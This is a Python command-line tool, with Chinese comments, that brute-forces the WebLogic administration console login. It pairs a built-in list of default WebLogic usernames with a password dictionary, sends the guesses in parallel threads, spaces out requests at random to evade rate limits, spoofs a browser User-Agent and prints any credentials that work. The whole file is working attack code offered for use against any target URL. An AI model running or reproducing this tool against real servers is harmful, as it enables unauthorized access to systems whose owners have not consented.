# -*- coding:utf-8 -*- 
# Date    : 2010/05/30
# Author  : hacden
# Function: weblogic vuln

import requests
import queue
import threading
import time
import sys
import random
import argparse

class WebLogic:
    def __init__(self, url,file,concurrent):
        self.file = file
        self.url = url
        print("The burte tarket url is:\n%s\nPwd dict file is:\n%s"%(self.url,self.file))
        self.concurrent = concurrent
        self.pwd_list = queue.Queue()
        self.req_thread = []
    def create_thread(self):
        try:
            #读取字典文件
            userdict = ['WebLogic', 'weblogic', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem',
                        'wlpisystem']
            print("启动请求线程%d号" % self.concurrent)
            for user in userdict:
                with open(self.file,"r") as dict:
                    for pwd in dict.readlines():
                        #字典加入队列
                        self.pwd_list.put(pwd.strip())
                    dict.close()
                req_thread = []
                for num in range(self.concurrent):
                    # 创造线程
                    t = threading.Thread(target=self.weakPasswd,args=(user,))
                    t.start()
                    req_thread.append(t)
                for t in req_thread:
                    # 等待线程结束
                    t.join()
        except IOError:
            print("字典文件不存在")
    def weakPasswd(self,user):
        try:
            """weak password"""
            while self.pwd_list.qsize() > 0:
                pwd = self.pwd_list.get()
                data = {
                'j_username':user,
                'j_password':pwd,
                'j_character_encoding':'UTF-8'
                }
                # 防止请求频率过快，随机设置阻塞时间
                time.sleep(random.randint(1, 4))
                headers ={
                            "Referer": self.url,
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36"
                          }
                req = requests.post(self.url, data=data, allow_redirects=False, verify=False,headers=headers)
                if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                    print('[+] WebLogic username: '+ user +'  password: ' + pwd)
                    if input("[++++++++++] Good lucky...please input [exit] to out:").strip() == "exit":
                        exit(0)
                else:
                    print("[-] username:%s password: %s \t----->No Login!"%(user,pwd))
        except:
            pass
    def run(self):
        print("正在准备爆破weblogic密码,请等待....")
        for i in range(21):
            if i != 20:
                print(">>", end="")
            else:
                print(">>")
            sys.stdout.flush()
            time.sleep(0.2)
        self.create_thread()
        if input("Burte is no Find!...please input [exit] to out:").strip() == "exit":
            exit(0)

if __name__ == '__main__':
    try:
        parse = argparse.ArgumentParser()
        parse.add_argument("-p", type=str, help="Please input pwd dict.")
        parse.add_argument("-u", type=str, help="Please input tarket url.")
        parse.add_argument("-t", type=int, default=5, help="Can you input threading? default is 5.")
        args = parse.parse_args()
        file = args.p
        # 获取输入的分割字符的长度
        url = args.u
        concurrent = args.t
        wls = WebLogic(url,file,concurrent)
        wls.run()
    except:
        exit(0)